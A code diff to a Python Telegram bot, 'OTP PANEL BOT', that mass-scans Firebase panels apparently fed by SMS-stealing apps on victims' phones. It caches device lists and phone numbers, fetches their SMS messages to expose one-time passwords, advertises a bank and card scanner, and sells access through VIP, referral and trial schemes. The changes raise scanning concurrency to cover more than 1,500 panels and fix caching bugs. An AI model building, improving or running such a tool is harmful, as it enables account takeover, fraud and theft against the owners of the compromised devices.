@@ -2,10 +2,9 @@
 """
 ══════════════════════════════════════════════════════
   OTP PANEL BOT — VANTAGE PRO + OMNIDIMENSION EDITION       
-  RAILWAY ANTI-CRASH OPTIMIZED | GHOST WEB SERVER
+  HYPER-FAST 1500+ PANEL SCANNER | ANTI-RESET CACHE
   DEEP SYNC (150) | BANK & CARDS SCANNER | PLAYWRIGHT
-  5-MIN & 30-MIN FRESH SCANNER | ALL API KEYS RESTORED
-  AUTO-LOAD PANELS FROM .TXT FILES | VIP & PROMO SYSTEM
+  RAILWAY ANTI-CRASH OPTIMIZED | GHOST WEB SERVER
 ══════════════════════════════════════════════════════
 """
 
@@ -113,11 +112,12 @@ user_focus: dict[str, dict[int, str]] = {TOKEN: {}}
 
 CLONES: dict[str, dict] = {}
 GLOBAL_DEVICE_CACHE: dict[str, list] = {}
-SCAN_PROGRESS = {"total": 1, "completed": 1}
+SCAN_PROGRESS = {"total": len(DATABASES), "completed": 0}
 SETTINGS = {"base_price": 30, "global_panels": []}
 
-HTTP_SEMAPHORE = asyncio.Semaphore(20)
-WORKER_SEMAPHORE = asyncio.Semaphore(20)
+# 🔥 HYPER-SPEED CONFIGURATION 🔥
+HTTP_SEMAPHORE = asyncio.Semaphore(100)
+WORKER_SEMAPHORE = asyncio.Semaphore(100)
 API_LOCK = asyncio.Lock()
 
 SYS_SETTINGS = {
@@ -230,10 +230,6 @@ def load_data():
                 sorted_res = list(n_map.values())
                 sorted_res.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
                 GLOBAL_DEVICE_CACHE["ALL"] = sorted_res
-                
-                if len(sorted_res) > 50:
-                    SCAN_PROGRESS["completed"] = 99999 
-                    SCAN_PROGRESS["total"] = 99999
         except Exception: pass
 
     for fname in os.listdir(USERS_DIR):
@@ -283,7 +279,6 @@ async def auto_save_loop():
         await asyncio.sleep(300) 
         await save_data_async()
 
-# 🔥 AUTO BACKUP LOOP RESTORED 🔥
 async def hourly_backup_loop(app: Application):
     while True:
         await asyncio.sleep(7200) 
@@ -305,7 +300,7 @@ async def hourly_backup_loop(app: Application):
 
 async def memory_sweeper():
     while True:
-        await asyncio.sleep(600) 
+        await asyncio.sleep(300) 
         now = time.time()
         expired_cd = [k for k, v in user_cooldowns.items() if now - v > 3600]
         for k in expired_cd: del user_cooldowns[k]
@@ -398,7 +393,7 @@ def device_label(d: 'Device') -> str: return " & ".join(d.numbers) if d.numbers 
 async def get_http_session() -> aiohttp.ClientSession:
     global _http_session
     if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=50, use_dns_cache=True, ttl_dns_cache=300)
+        connector = aiohttp.TCPConnector(limit=100, use_dns_cache=True, ttl_dns_cache=300)
         _http_session = aiohttp.ClientSession(connector=connector)
     return _http_session
 
@@ -416,10 +411,9 @@ async def fb_get(path: str, base: str, auth: str = None, query: str = "") -> Opt
         try:
             session = await get_http_session()
             url = build_fb_url(base, path, auth=auth, query=query)
-            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
-                if r.status != 200: return None
-                try: return await r.json(content_type=None)
-                except: return None
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
+                if r.status == 200: return await r.json(content_type=None)
+                return None
         except: return None
 
 async def fb_keys(path: str, base: str, auth: str = None) -> list[str]:
@@ -427,15 +421,14 @@ async def fb_keys(path: str, base: str, auth: str = None) -> list[str]:
         try:
             session = await get_http_session()
             url = build_fb_url(base, path, auth=auth, shallow=True)
-            async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
-                if r.status != 200: return []
-                try:
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
+                if r.status == 200:
                     data = await r.json(content_type=None)
                     return list(data.keys()) if isinstance(data, dict) else []
-                except: return []
+                return []
         except: return []
 
-async def fetch_db_data(tag: str, db_config: dict) -> list[Device]:
+async def fetch_db_data(tag: str, db_config: dict) -> Optional[list[Device]]:
     url = db_config["url"]
     auth = db_config.get("auth")
     
@@ -480,8 +473,9 @@ async def fetch_db_data(tag: str, db_config: dict) -> list[Device]:
                     added_set.add(dev_id)
                     model = client.get("modelName") or f"Device-{dev_id[:6]}"
                     devices_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}", sms_path=f"messages/{dev_id}", base_url=url, db_tag=tag, auth=auth))
-        except Exception: pass
-        return devices_list
+            return devices_list
+        except Exception:
+            return None # 🔴 FIX: Return None on failure to prevent wiping cache
 
 async def check_number_api(service: str, number: str, retries=2) -> dict:
     clean_number = re.sub(r"\D", "", str(number))[-10:]
@@ -548,6 +542,7 @@ async def enforce_access(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, reply_fun
     await reply_func(f"🛑 <b>TRIAL EXPIRED</b> 🛑\nPremium panels ke liye <b>10 referrals</b> chahiye.\n📉 Referrals: {refs}/10\n🔗 Link: <code>{ref_link}</code>", parse_mode="HTML")
     return False
 
+# 🔴 FIX: 0 DEVICES FALLBACK BUG SOLVED
 async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
     if users_db is None: users_db = {}
     u_data = users_db.get(chat_id, {})
@@ -556,9 +551,17 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
     if is_global_view and "ALL" in GLOBAL_DEVICE_CACHE and len(GLOBAL_DEVICE_CACHE["ALL"]) > 0:
         return GLOBAL_DEVICE_CACHE["ALL"]
 
-    dbs_to_check = [f"U_{chat_id}_{i}" for i, _ in enumerate(get_user_dbs(u_data))]
+    # Gather from individual tags if "ALL" is empty or still building
+    dbs_to_check = []
+    if is_global_view:
+        dbs_to_check.extend([tag for tag in GLOBAL_DEVICE_CACHE.keys() if tag != "ALL"])
+    
+    for i, _ in enumerate(get_user_dbs(u_data)): 
+        dbs_to_check.append(f"U_{chat_id}_{i}")
+
     all_gathered = []
-    for tag in dbs_to_check: all_gathered.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
+    for tag in set(dbs_to_check): 
+        all_gathered.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
 
     number_map = {}
     for d in all_gathered:
@@ -642,18 +645,6 @@ def get_app_search_menu():
         [InlineKeyboardButton("🟣 Zepto", callback_data="app_search:zepto"), InlineKeyboardButton("🟡 Blinkit", callback_data="app_search:blinkit")],
         [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
     ])
-
-def format_checker_result(service: str, number: str, is_reg: bool, ms: int, is_error: bool = False, err_msg: str = ""):
-    srv_name, emoji = service.capitalize(), "✨"
-    for row in get_checker_menu().inline_keyboard:
-        for btn in row:
-            if service.lower() in btn.text.lower():
-                parts = btn.text.split(" ")
-                emoji, srv_name = parts[0], " ".join(parts[1:])
-                break
-    display_num = number if str(number).startswith("+") else f"+{number}"
-    if is_error: return f"⚠ <b>ERROR</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms\n\n<i>{err_msg}</i>"
-    return f"<b>{'✅ REGISTERED' if is_reg else '❌ UNREGISTERED'}</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms"
 
 def device_list_header(devices: list[Device], page: int = 0) -> str:
     online  = sum(1 for d in devices if d.status == "online")
@@ -941,39 +932,8 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 # ═══════════════════════════════════════════════════════
-#  CORE TELEGRAM HANDLERS (THE MISSING PIECE RESTORED)
+#  CORE CALLBACK HANDLERS
 # ═══════════════════════════════════════════════════════
-
-async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
-    chat_id  = update.effective_chat.id
-    
-    if chat_id not in all_users:
-        all_users[chat_id] = {
-            "name": update.effective_user.first_name, 
-            "username": update.effective_user.username, 
-            "joined_at": datetime.now().strftime("%d %b %Y"), 
-            "referrals": 0, "access_until": 0, "global_trial_end": time.time() + 1800, "personal_trial_end": 0, 
-            "has_global_access": False, "otp_count": 0, "custom_dbs": [], "selected_panel": "ALL"
-        }
-        text = update.message.text.split()
-        if len(text) > 1 and text[1].isdigit():
-            ref_id = int(text[1])
-            if ref_id in all_users and ref_id != chat_id:
-                all_users[ref_id]["referrals"] = all_users[ref_id].get("referrals", 0) + 1
-                save_user(ref_id)
-        save_user(chat_id)
-        
-        try:
-            msg = "🎉 <b>WELCOME BONUS!</b>\nAapko <b>30-Mins ka FREE Global VIP Access</b> mila hai! Aap sabhi admin panels aur numbers dekh sakte hain.\n\n<i>30 minute baad global numbers hide ho jayenge, uske baad '💳 Add Panel' karke apna Firebase daalne par aapko 1 Hour ka extra Personal Trial milega!</i>"
-            await ctx.bot.send_message(chat_id, msg, parse_mode="HTML")
-        except: pass
-
-    if update.effective_chat.type == "private" and not await check_force_sub(ctx.bot, chat_id):
-        await update.message.reply_text("🛑 <b>Aage badhne ke liye in channels ko join karna compulsory hai!</b>", parse_mode="HTML", reply_markup=force_sub_keyboard())
-        return
-
-    user_focus.setdefault(ctx.bot.token, {}).pop(chat_id, None)
-    await update.message.reply_text(f"🔥 VANTAGE PANEL + OMNIDIMENSION BOT 🔥\n━━━━━━━━━━━━━━━━━━\nWelcome {update.effective_user.first_name}!\n\n👉 Type: /call to launch AI Voice Agent\n👉 Or use the menu below for OTP & Bank Panel.", reply_markup=get_reply_menu(chat_id))
 
 async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     query   = update.callback_query
@@ -1666,16 +1626,16 @@ async def fetch_recent_sms_safely(d: Device, silent=False):
                         except: pass
     except: pass
 
-WORK_QUEUE = asyncio.Queue(maxsize=3000)
+WORK_QUEUE = asyncio.Queue(maxsize=10000)
 ACTIVE_WORKERS = []
-MAX_WORKERS = 10 
+MAX_WORKERS = 50 
 
 async def worker_auto_scaler():
     global ACTIVE_WORKERS
     while True:
         try:
             q_size = WORK_QUEUE.qsize()
-            target_workers = min(MAX_WORKERS, max(3, q_size // 2)) 
+            target_workers = min(MAX_WORKERS, max(5, q_size // 2)) 
             ACTIVE_WORKERS = [w for w in ACTIVE_WORKERS if not w.done()]
             while len(ACTIVE_WORKERS) < target_workers:
                 task = asyncio.create_task(db_processor_worker())
@@ -1691,14 +1651,16 @@ async def db_processor_worker():
             if job_type == "INIT" or job_type == "CACHE_UPDATE":
                 try: 
                     devs = await fetch_db_data(tag, db_config)
-                    if devs: GLOBAL_DEVICE_CACHE[tag] = devs
+                    if devs is not None:
+                        GLOBAL_DEVICE_CACHE[tag] = devs
+                    
+                    if job_type == "INIT":
+                        SCAN_PROGRESS["completed"] += 1
+                        active_devs = [d for d in GLOBAL_DEVICE_CACHE.get(tag, []) if d.status == "online"]
+                        if active_devs:
+                            for i in range(0, len(active_devs), 10):
+                                await asyncio.gather(*(fetch_recent_sms_safely(d, silent=True) for d in active_devs[i:i+10]))
                 except: pass
-                
-                if job_type == "INIT":
-                    active_devs = [d for d in GLOBAL_DEVICE_CACHE.get(tag, []) if d.status == "online"]
-                    if active_devs:
-                        for i in range(0, len(active_devs), 10):
-                            await asyncio.gather(*(fetch_recent_sms_safely(d, silent=True) for d in active_devs[i:i+10]))
 
             elif job_type == "POLL":
                 now = time.time()
@@ -1747,12 +1709,13 @@ async def master_dispatcher(app: Application) -> None:
                         dbs_to_poll[f"U_{uid}_{i}"] = db_config
             
             if first_run:
+                SCAN_PROGRESS["total"] = len(dbs_to_poll)
+                SCAN_PROGRESS["completed"] = 0
                 for tag, config in dbs_to_poll.items():
                     try: WORK_QUEUE.put_nowait(("INIT", tag, config))
                     except asyncio.QueueFull: pass
                 first_run = False
                 last_cache_time = time.time()
-                print("\n✅ Bot started successfully. Vantage & Playwright Active.\n")
             else:
                 now = time.time()
                 for tag, config in dbs_to_poll.items():
@@ -1791,7 +1754,7 @@ def main() -> None:
 
     async def post_init(application: Application) -> None:
         load_data()
-        asyncio.create_task(start_dummy_server()) # 🚀 Starts the Railway server
+        asyncio.create_task(start_dummy_server()) 
         asyncio.create_task(worker_auto_scaler()) 
         asyncio.create_task(cache_compiler())
         asyncio.create_task(memory_sweeper())
@@ -1800,7 +1763,7 @@ def main() -> None:
         asyncio.create_task(hourly_backup_loop(application))
 
     app.post_init = post_init
-    print(f"\n🚀 Starting the ULTIMATE Vantage Pro + Omni Server... \n[*] Auto-Loading Panel Files...")
+    print(f"\n🚀 Starting the ULTIMATE Vantage Pro + Omni Server... \n[*] Auto-Loaded {len(RAW_URLS)} Panels from files!")
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
